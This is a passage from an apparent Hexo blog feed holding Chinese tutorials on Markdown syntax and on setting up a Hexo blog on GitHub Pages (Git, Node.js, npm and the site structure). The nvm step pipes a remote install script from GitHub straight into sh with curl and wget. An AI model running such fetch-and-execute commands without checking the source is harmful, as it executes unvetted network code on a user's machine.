class="code">(```)</span></span><br></pre></td></tr></table></figure><blockquote><p>注：为了防止转译，前后三个反引号处加了小括号，实际是没有的。这里只是用来演示，实际中去掉两边小括号即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; <span class="string">"hello markdown"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="格式化代码html版"><a href="#格式化代码html版" class="headerlink" title="格式化代码html版"></a>格式化代码html版</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span></span><br><span class="line"><span class="section">## 这是一个不起作用的标题</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br></pre></td></tr></table></figure><pre>## 这是一个不起作用的标题</pre><hr><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p>注：<strong> <code>st=&gt;start: 开始</code> 的<code>：</code>后面保持空格</strong></p><table><thead><tr><th>形参</th><th>实参</th><th>含义</th></tr></thead><tbody><tr><td>tag</td><td>st</td><td>标签 (可以自定义)</td></tr><tr><td>=&gt;</td><td>=&gt;</td><td>赋值</td></tr><tr><td>type</td><td>start</td><td>类型  (6种类型)</td></tr><tr><td>content</td><td>开始</td><td>描述内容 (可以自定义)</td></tr><tr><td>:&gt;url</td><td><code>http://www.baidu.com[blank]</code></td><td>链接与跳转方式 <strong>兼容性很差</strong></td></tr></tbody></table><table><thead><tr><th>6种类型</th><th>含义</th></tr></thead><tbody><tr><td>start</td><td>启动</td></tr><tr><td>end</td><td>结束</td></tr><tr><td>operation</td><td>程序</td></tr><tr><td>subroutine</td><td>子程序</td></tr><tr><td>condition</td><td>条件</td></tr><tr><td>inputoutput</td><td>输出</td></tr></tbody></table><table><thead><tr><th>形参</th><th>实参</th><th>含义</th></tr></thead><tbody><tr><td>-&gt;</td><td>-&gt;</td><td>连接</td></tr><tr><td>condition</td><td>c1</td><td>条件</td></tr><tr><td>(布尔值,方向)</td><td>(yes,right)</td><td>如果满足向右连接，4种方向：right ，left，up ，down 默认为：down</td></tr></tbody></table><p>注：operation (程序); subroutine (子程序) ;condition (条件)，都可以在括号里加入连接方向。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">```flow</span></span><br><span class="line"><span class="code">st=&gt;start: 开始</span></span><br><span class="line"><span class="code">op=&gt;operation: My Operation</span></span><br><span class="line"><span class="code">cond=&gt;condition: Yes or No?</span></span><br><span class="line"><span class="code">e=&gt;end</span></span><br><span class="line"><span class="code">st-&gt;op-&gt;cond</span></span><br><span class="line"><span class="code">cond(yes)-&gt;e</span></span><br><span class="line"><span class="code">cond(no)-&gt;op</span></span><br><span class="line"><span class="code">&amp;```</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">st=&gt;start: 开始</span><br><span class="line">op=&gt;operation: My Operation</span><br><span class="line">cond=&gt;condition: Yes or No?</span><br><span class="line">e=&gt;end</span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br><span class="line">&amp;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 选项框</span><br><span class="line"></span><br><span class="line">```markdown</span><br><span class="line">- [x] 选项一</span><br><span class="line">- [ ] 选项二  </span><br><span class="line">需要注意的是：-、[x]、和选择一之间都要有空格，如果不下x[ ]中也要有空格</span><br></pre></td></tr></table></figure><ul><li style="list-style: none"><input type="checkbox" checked> 选项一</li><li style="list-style: none"><input type="checkbox"> 选项二</li></ul><hr><h2 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h2><p>支持LaTex的数学公式，参考<a href="https://www.jianshu.com/p/2bbec51d756f" target="_blank" rel="noopener"><a href="https://www.jianshu.com/p/2bbec51d756f" target="_blank" rel="noopener">https://www.jianshu.com/p/2bbec51d756f</a></a></p><p>数学公式（MathJax)，参考<a href="https://www.jianshu.com/p/a0aa94ef8ab2" target="_blank" rel="noopener"><a href="https://www.jianshu.com/p/a0aa94ef8ab2" target="_blank" rel="noopener">https://www.jianshu.com/p/a0aa94ef8ab2</a></a></p><p>注：1个$左对齐，2个居中</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$$ x \href&#123;why-equal.html&#125;&#123;=&#125; y^2 + 1 $$</span><br><span class="line">$ x = &#123;-b \pm \sqrt&#123;b^2-4ac&#125; \over 2a&#125;. $</span><br></pre></td></tr></table></figure><p>$$<br>x \href{why-equal.html}{=} y^2 +1<br>$$</p><p>使用Typora的时候可以直接使用 $$+回车，或者用crtl+shift+M生成公式块（在段落菜单中的公式块）</p><p>参考<a href="https://blog.csdn.net/mingzhuo_126/article/details/82722455" target="_blank" rel="noopener"><a href="https://blog.csdn.net/mingzhuo_126/article/details/82722455" target="_blank" rel="noopener">https://blog.csdn.net/mingzhuo_126/article/details/82722455</a></a></p><hr><h2 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Markdown[^1]</span><br><span class="line">[<span class="symbol">^1</span>]: <span class="link">Markdown是一种纯文本标记语言        // 在文章最后面显示脚注</span></span><br></pre></td></tr></table></figure><p>Markdown<a href="markdown是一种纯文本标记语言">^1</a></p><hr><h2 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h2><p>注：只有<strong>标题</strong>支持锚点， 跳转目录方括号后 保持空格</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">公式标题锚点</span>](<span class="link">#1</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">### [需要跳转的目录] &#123;#1&#125;    // 方括号后保持空格</span></span><br></pre></td></tr></table></figure><p><a href="#1">脚注标题锚点</a></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">由于&#123;# 是hexo的标注语言</span><br><span class="line">hexo 中 &#123;# 属于保留字段 &#123;# ... #&#125;属于注释字段</span><br><span class="line">把<span class="code">```以外的&#123;#改成&#123;&#123; '&#123;#' &#125;&#125;即可解决</span></span><br></pre></td></tr></table></figure><hr><h2 id="自动邮箱链接"><a href="#自动邮箱链接" class="headerlink" title="自动邮箱链接"></a>自动邮箱链接</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">xxx@outlook.com</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><a href="mailto:&#x78;&#x78;&#120;&#64;&#x6f;&#117;&#116;&#x6c;&#x6f;&#111;&#107;&#46;&#99;&#111;&#x6d;" target="_blank" rel="noopener">&#x78;&#x78;&#120;&#64;&#x6f;&#117;&#116;&#x6c;&#x6f;&#111;&#107;&#46;&#99;&#111;&#x6d;</a></p><hr><h2 id="时序图"><a href="#时序图" class="headerlink" title="时序图"></a>时序图</h2><p><strong>代码1</strong></p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">​```<span class="keyword">sequence</span></span><br><span class="line">A-&gt;&gt;B: 你好</span><br><span class="line"><span class="literal">Note</span> left <span class="keyword">of</span> A: 我在左边     // 注释方向，只有左右，没有上下</span><br><span class="line"><span class="literal">Note</span> right <span class="keyword">of</span> B: 我在右边</span><br><span class="line">B<span class="comment">--&gt;A: 很高兴认识你</span></span><br><span class="line">​</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="strong">**演示**</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https:////upload-images.jianshu.io/upload_images/6912209-784ce9bb7beb6672.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/393/format/webp</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="strong">**代码详解**</span></span><br><span class="line"></span><br><span class="line">注：<span class="code">`A-&gt;&gt;B: 你好`</span>   后面可以不写文字，但是一定要在最后加上<span class="code">`：`</span></span><br><span class="line"> Note left of A 代表注释在A的左边</span><br><span class="line"></span><br><span class="line">| 符号 | 含义     |</span><br><span class="line">| ---- | -------- |</span><br><span class="line">| <span class="code">`-`</span>  | 实线     |</span><br><span class="line">| <span class="code">`&gt;`</span>  | 实心箭头 |</span><br><span class="line">| <span class="code">`--`</span> | 虚线     |</span><br><span class="line">| <span class="code">`&gt;&gt;`</span> | 空心箭头 |</span><br><span class="line"></span><br><span class="line"><span class="strong">**代码2**</span></span><br></pre></td></tr></table></figure><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">起床-&gt;吃饭: 稀饭油条</span><br><span class="line">吃饭-&gt;上班: 不要迟到了</span><br><span class="line">上班-&gt;午餐: 吃撑了</span><br><span class="line">上班-&gt;下班:</span><br><span class="line">Note right of 下班: 下班了</span><br><span class="line">下班-&gt;回家:</span><br><span class="line">Note right of 回家: 到家了</span><br><span class="line">回家--&gt;&gt;起床:</span><br><span class="line">Note left of 起床: 新的一天</span><br></pre></td></tr></table></figure></code></pre><p><strong>演示</strong></p><p><img src="https://magic-king.net/images/loading.gif" data-original="https://upload-images.jianshu.io/upload_images/6912209-f109a13fcf7e2ccb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/577/format/webp" alt="img"></p><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><p>由于markdown语法的原因，可以用\进行转义。</p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+gitpages</title>
      <link href="/2019/05/14/hexo-gitpages/"/>
      <url>/2019/05/14/hexo-gitpages/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo-gitPages搭建个人博客"><a href="#hexo-gitPages搭建个人博客" class="headerlink" title="hexo+gitPages搭建个人博客"></a>hexo+gitPages搭建个人博客</h1><blockquote><p>本文参考</p><p><strong>hexo 博客搭建</strong></p><p><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">hexo官方文档</a></p><p><a href="https://juejin.im/post/5bebfe51e51d45332a456de0" target="_blank" rel="noopener">【持续更新】最全Hexo博客搭建+主题优化+插件配置+常用操作+错误分析</a></p><p><a href="https://blog.csdn.net/gsl9d1p04f6x2ts3c9/article/details/81024330" target="_blank" rel="noopener">手把手教你搭建自己的个人博客（图文教程）</a></p><p><a href="[https://www.chakid.com/2017/07/05/%E4%B8%80%E3%80%81%E6%90%AD%E5%BB%BA%E7%AF%87-%E4%BD%BF%E7%94%A8Github-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B%E2%80%94%E6%80%BB%E7%BB%93%E8%87%AA%E5%B7%B1%E7%88%AC%E8%BF%87%E7%9A%84%E5%9D%91/](https://www.chakid.com/2017/07/05/一、搭建篇-使用Github-hexo搭建个人博客教程—总结自己爬过的坑/">搭建篇 –使用Github+hexo搭建个人博客教程—总结自己爬过的坑</a>)</p><p><a href="https://zhuanlan.zhihu.com/p/26625249?utm_source=weibo&amp;utm_medium=social" target="_blank" rel="noopener">GitHub+Hexo 搭建个人网站详细教程</a></p><p><a href="https://xuanwo.io/2015/03/26/hexo-intor/" target="_blank" rel="noopener">史上最详细的Hexo博客搭建图文教程</a></p><p><strong>hexo优化</strong></p><p><a href="https://www.chakid.com/2018/05/26/hexo%E5%8D%9A%E5%AE%A2%E6%94%B9%E8%A3%85%E5%92%8C%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82%E4%BC%98%E5%8C%96/" target="_blank" rel="noopener">hexo博客改装和一些细节优化</a></p><p><a href="https://www.chakid.com/2018/05/26/hexo博客改装和一些细节优化" target="_blank" rel="noopener">https://www.chakid.com/2018/05/26/hexo博客改装和一些细节优化</a></p><p><a href="https://www.cnblogs.com/xingyunblog/p/8681205.html" target="_blank" rel="noopener">Hexo NexT 博客后台管理指南</a></p><p><a href="https://blog.csdn.net/qq_36177977/article/details/83826453" target="_blank" rel="noopener">Hexo主题更改以及小功能的添加</a></p><p><strong>hexo-NexT主题配置</strong></p><p><a href="https://theme-next.org/archives/" target="_blank" rel="noopener">NexT官方展示</a></p><p><a href="https://github.com/theme-next/hexo-theme-next/blob/master/docs/zh-CN/README.md" target="_blank" rel="noopener">NexT官方中文文档ReadME</a></p><p><a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">NexT源码</a></p><p><a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">NexT文档</a></p><p><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">Hexo的Next主题详细配置</a></p><p><a href="https://www.cnblogs.com/php-linux/p/8416122.html" target="_blank" rel="noopener">hexo的next主题个性化教程:打造炫酷网站</a></p><p><a href="https://blog.csdn.net/qq_33699981/article/details/72716951" target="_blank" rel="noopener">hexo的next主题个性化教程：打造炫酷网站</a></p><p><a href="https://inspurer.github.io/2018/11/11/hexo-next主题优化/" target="_blank" rel="noopener">【持续更新】hexo next主题优化手册</a></p><p><a href="https://inspurer.github.io/archives/" target="_blank" rel="noopener">可参考博客嘤</a></p><p><a href="https://guanqr.com/tech/website/hexo-theme-next-customization/" target="_blank" rel="noopener">https://guanqr.com/tech/website/hexo-theme-next-customization/</a></p><p><a href="https://biqianhan-zidi.github.io/" target="_blank" rel="noopener">https://biqianhan-zidi.github.io/</a></p><p><strong>yilia主题</strong></p><p><a href="https://github.com/litten/hexo-theme-yilia" target="_blank" rel="noopener">yilia主题源码（GitHub）</a></p><p><a href="http://litten.me/" target="_blank" rel="noopener">yilia主题展示</a></p><p>hexo+gitpage优化：</p><p><a href="https://blog.lgf.im/2020/03/speedup-github-page/#" target="_blank" rel="noopener">https://blog.lgf.im/2020/03/speedup-github-page/#</a></p></blockquote><h2 id="hexo博客搭建"><a href="#hexo博客搭建" class="headerlink" title="hexo博客搭建"></a>hexo博客搭建</h2><h3 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h3><p>安装 Hexo 相当简单。然而在安装前，您必须检查电脑中是否已安装下列应用程序：</p><ul><li><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a> (Should be at least nodejs 6.9)</li><li><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></li></ul><p>如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g hexo-cli</span></span><br></pre></td></tr></table></figure><p>如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。</p><p>如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。</p><blockquote><p>Mac 用户</p><p>您在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 <strong>Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install</strong> 安装命令行工具。</p></blockquote><h3 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h3><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a>.</li><li>Mac：使用 <a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>, <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> ：<code>brew install git</code>;或下载 <a href="http://sourceforge.net/projects/git-osx-installer/" target="_blank" rel="noopener">安装程序</a> 安装。</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li></li><li><p>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code></p></li></ul><blockquote><p>Windows 用户</p><p>由于众所周知的原因，从上面的链接下载git for windows最好挂上一个代理，否则下载速度十分缓慢。也可以参考<a href="https://github.com/waylau/git-for-win" target="_blank" rel="noopener">这个页面</a>，收录了存储于百度云的下载地址。</p></blockquote><h3 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h3><p>安装 Node.js 的最佳方式是使用 <a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">nvm</a>。</p><p>cURL:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http<span class="variable">s:</span>//raw.github.<span class="keyword">com</span>/creationix/nvm/v0.<span class="number">33.11</span>/install.<span class="keyword">sh</span> | <span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p>Wget:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO- http<span class="variable">s:</span>//raw.github.<span class="keyword">com</span>/creationix/nvm/v0.<span class="number">33.11</span>/install.<span class="keyword">sh</span> | <span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p>安装完成后，重启终端并执行下列命令即可安装 Node.js。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nvm install stable</span></span><br></pre></td></tr></table></figure><p>或者您也可以下载 <a href="http://nodejs.org/" target="_blank" rel="noopener">安装程序</a> 来安装。</p><blockquote><p>Windows 用户</p><p>对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选<strong>Add to PATH</strong>选项。<br>另外，您也可以使用<strong>Git Bash</strong>，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用<strong>Git Bash</strong>来进行操作。</p></blockquote><h3 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g hexo-cli</span></span><br></pre></td></tr></table></figure><p>在安装的时候我用的是<code>npm install hexo --save</code></p><h2 id="关于npm命令"><a href="#关于npm命令" class="headerlink" title="关于npm命令"></a>关于npm命令</h2><h3 id="回顾-npm-install-命令"><a href="#回顾-npm-install-命令" class="headerlink" title="回顾 npm install 命令"></a>回顾 npm install 命令</h3><p>最近在写Node程序的时候，突然对 npm install 的-save和-save-dev 这两个参数的使用比较混乱。其实博主在这之前对这两个参数的理解也是模糊的，各种查资料和实践后对它们之间的异同点略有理解。遂写下这篇文章避免自己忘记，同时也给node猿友一点指引。</p><p>我们在使用 npm install 安装模块的模块的时候 ，一般会使用下面这几种命令形式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install moduleName # 安装模块到项目目录下`</span><br><span class="line">npm install -g moduleName # -g 的意思是将模块安装到全局，具体安装到磁盘哪个位置，要看 npm config prefix 的位置。</span><br><span class="line">npm install -save moduleName # -save 的意思是将模块安装到项目目录下，并在package文件的dependencies节点写入依赖。</span><br><span class="line">npm install -save-dev moduleName # -save-dev 的意思是将模块安装到项目目录下，并在package文件的devDependencies节点写入依赖。</span><br></pre></td></tr></table></figure><p>那么问题来了，在项目中我们应该使用四个命令中的哪个呢？这个就要视情况而定了。下面对这四个命令进行对比，看完后你就不再这么问了。</p><h3 id="npm-install-moduleName-命令"><a href="#npm-install-moduleName-命令" class="headerlink" title="npm install moduleName 命令"></a>npm install moduleName 命令</h3><ol><li>安装模块到项目node_modules目录下。</li><li>不会将模块依赖写入devDependencies或dependencies 节点。</li><li>运行 npm install 初始化项目时不会下载模块。</li></ol><h3 id="npm-install-g-moduleName-命令"><a href="#npm-install-g-moduleName-命令" class="headerlink" title="npm install -g moduleName 命令"></a>npm install -g moduleName 命令</h3><ol><li>安装模块到全局，不会在项目node_modules目录中保存模块包。</li><li>不会将模块依赖写入devDependencies或dependencies 节点。</li><li>运行 npm install 初始化项目时不会下载模块。</li></ol><h3 id="npm-install-save-moduleName-命令"><a href="#npm-install-save-moduleName-命令" class="headerlink" title="npm install -save moduleName 命令"></a>npm install -save moduleName 命令</h3><ol><li>安装模块到项目node_modules目录下。</li><li>会将模块依赖写入dependencies 节点。</li><li>运行 npm install 初始化项目时，会将模块下载到项目目录下。</li><li>运行npm install –production或者注明NODE_ENV变量值为production时，<strong>会</strong>自动下载模块到node_modules目录中。</li></ol><h3 id="npm-install-save-dev-moduleName-命令"><a href="#npm-install-save-dev-moduleName-命令" class="headerlink" title="npm install -save-dev moduleName 命令"></a>npm install -save-dev moduleName 命令</h3><ol><li>安装模块到项目node_modules目录下。</li><li>会将模块依赖写入devDependencies 节点。</li><li>运行 npm install 初始化项目时，会将模块下载到项目目录下。</li><li>运行npm install –production或者注明NODE_ENV变量值为production时，<strong>不会</strong>自动下载模块到node_modules目录中。</li></ol><h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><p>&lt;folder&gt; 为hexo安装目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo init &lt;folder&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> &lt;folder&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install</span></span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="variable">_config</span>.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── <span class="variable">_drafts</span></span><br><span class="line">|   └── <span class="variable">_posts</span></span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><h3 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h3><p>网站的 <a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">配置</a> 信息，您可以在此配置大部分的参数。</p><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><p>应用程序的信息。<a href="https://ejs.co/" target="_blank" rel="noopener">EJS</a>, <a href="http://learnboost.github.io/stylus/" target="_blank" rel="noopener">Stylus</a> 和 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a> renderer 已默认安装，您可以自由移除。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">package</span>.<span class="title">json</span>&#123;</span></span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"hexo-site"</span>,</span><br><span class="line">  <span class="string">"version"</span>: <span class="string">"0.0.0"</span>,</span><br><span class="line">  <span class="string">"private"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">"hexo"</span>: &#123;</span><br><span class="line">    <span class="string">"version"</span>: <span class="string">""</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="string">"hexo"</span>: <span class="string">"^3.8.0"</span>,</span><br><span class="line">    <span class="string">"hexo-generator-archive"</span>: <span class="string">"^0.1.5"</span>,</span><br><span class="line">    <span class="string">"hexo-generator-category"</span>: <span class="string">"^0.1.3"</span>,</span><br><span class="line">    <span class="string">"hexo-generator-index"</span>: <span class="string">"^0.2.1"</span>,</span><br><span class="line">    <span class="string">"hexo-generator-tag"</span>: <span class="string">"^0.2.0"</span>,</span><br><span class="line">    <span class="string">"hexo-renderer-ejs"</span>: <span class="string">"^0.3.1"</span>,</span><br><span class="line">    <span class="string">"hexo-renderer-stylus"</span>: <span class="string">"^0.3.3"</span>,</span><br><span class="line">    <span class="string">"hexo-renderer-marked"</span>: <span class="string">"^0.3.2"</span>,</span><br><span class="line">    <span class="string">"hexo-server"</span>: <span class="string">"^0.3.3"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="scaffolds"><a href="#scaffolds" class="headerlink" title="scaffolds"></a>scaffolds</h3><p><a href="https://hexo.io/zh-cn/docs/writing" target="_blank" rel="noopener">模版</a> 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p><p>Hexo的模板是指在新建的markdown文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。</p><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>资源文件夹是存放用户资源的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹，而其他文件会被拷贝过去。</p><h3 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h3><p><a href="https://hexo.io/zh-cn/docs/themes" target="_blank" rel="noopener">主题</a> 文件夹。Hexo 会根据主题来生成静态页面。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>您可以在 <code>_config.yml</code> 中修改大部分的配置。</p><p><iframe src="https://www.youtube.com/embed/A0Enyn70jKU" frameborder="0" allowfullscreen style="box-sizing: inherit; margin: 1em 0px; padding: 0px; border: 0px; outline: 0px; font-weight: inherit; font-style: inherit; font-family: inherit; font-size: 15px; vertical-align: baseline;"></iframe></p><h3 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>title</code></td><td style="text-align:left">网站标题</td></tr><tr><td style="text-align:left"><code>subtitle</code></td><td style="text-align:left">网站副标题</td></tr><tr><td style="text-align:left"><code>description</code></td><td 